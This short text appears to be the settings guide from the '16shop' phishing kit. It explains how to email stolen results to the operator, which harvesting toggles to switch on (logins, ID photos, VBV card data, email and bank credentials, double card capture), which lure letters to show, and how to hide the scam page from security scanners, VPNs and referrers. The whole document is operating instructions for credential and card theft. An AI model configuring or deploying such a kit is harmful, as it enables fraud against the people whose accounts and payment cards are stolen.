This is how to set custom setting,use your brain.



email_result = (set your email result)
lock_platform = (on|off)
sender_mail = (change sender to current host, ex : sender@myscampage.com)
site_parameter = (16shop) will result yourdomain.com/?16shop
site_password = "16shop"
site_param_on = (on|off)
site_pass_on = (on|off)
send_login = (on|off)
get_photo = (on|off)
get_vbv = (on|off)
get_email = (on|off)
get_bank = (on|off)
onetime = (on|off)
block_host = (on|off)
block_ua = (on|off)
block_iprange = (on|off)
block_isp = (on|off)
block_vpn = (on|off)
letter = (unusual_activity|limited)
double_cc = (on|off)
block_referrer = (on|off)